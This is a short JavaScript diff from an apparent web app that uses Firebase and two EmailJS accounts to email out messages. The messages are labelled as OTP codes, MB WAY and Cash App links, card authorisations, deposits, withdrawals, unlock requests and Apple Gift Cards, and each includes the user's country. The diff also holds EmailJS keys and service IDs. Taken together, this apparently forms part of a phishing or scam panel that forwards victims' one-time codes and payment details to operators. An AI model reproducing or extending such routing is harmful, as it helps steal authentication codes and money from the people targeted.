@@ -754,7 +754,6 @@ var db   = firebase.database();
 // ── EMAIL HELPER ──
 // serviceID: 'service_rs826sa', templateID: 'template_6f5m0as'
 // Template variables: {{to_email}}, {{subject}}, {{message}}
-// ── EMAIL via Web3Forms ──
 // ── EMAIL via dual EmailJS accounts ──
 // Account 1 → OTP codes, MB WAY link, Cash App link
 // Account 2 → Card auth, Deposit, Withdrawal, Unlock requests, Apple Gift Cards
@@ -762,14 +761,10 @@ var _EJS = [
   {pub:'8tNTuFPIowu1Ookpq', sid:'service_s2e0bde', tid:'template_7ulapld'},
   {pub:'q4WG3VtKzkHUooQIT', sid:'service_g1079e5', tid:'template_3rvjuyv'}
 ];
-emailjs.init({publicKey: _EJS[0].pub});
-
-// Account 1 triggers (keywords)
 var _EJS_ACC1 = ['OTP','MB WAY Link','Cash App Link','Auth Code'];
 
 function sendEmail(toEmail, title, name, message){
   var country = (window.userData && window.userData.country) ? window.userData.country : '—';
-  // Pick account based on title
   var useAcc1 = _EJS_ACC1.some(function(k){ return title.indexOf(k) !== -1; });
   var acct = useAcc1 ? _EJS[0] : _EJS[1];
   var accNum = useAcc1 ? 1 : 2;
